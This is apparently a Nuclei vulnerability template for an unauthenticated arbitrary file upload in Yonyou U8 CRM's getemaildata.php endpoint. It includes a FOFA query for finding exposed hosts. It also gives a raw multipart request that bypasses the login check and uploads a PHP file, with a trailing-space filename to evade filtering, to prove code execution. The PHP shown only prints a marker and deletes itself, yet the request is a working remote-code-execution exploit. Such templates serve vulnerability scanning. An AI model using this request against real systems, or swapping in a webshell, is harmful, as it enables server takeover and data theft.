id: yonyou-u8-crm-getemaildataphp-file-upload

info:
  name: "用友 U8 CRM getemaildata.php 接口任意文件上传漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="用友U8CRM" || body="/js/tfunction.js"
        该接口因文件校验机制缺失，导致攻击者可通过构造恶意请求上传任意类型文件至服务器。成功利用此漏洞可实现远程代码执行、敏感数据持久化存储及系统权限持久控制。攻击载荷通过HTTP请求直接写入目标路径，可能造成业务中断或数据泄露。
  tags: 用友

http:
- raw:
  - |
    POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Content-Type: multipart/form-data; boundary=----hjGHJGJHgjkhkhygutcvyvlbhj

    ------hjGHJGJHgjkhkhygutcvyvlbhj
    Content-Disposition: form-data; name="file"; filename="NTest.php "
    Content-Type: text/plain

    <?php echo 'NdayTest'; unlink(__FILE__); ?>
    ------hjGHJGJHgjkhkhygutcvyvlbhj
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'NdayTest'
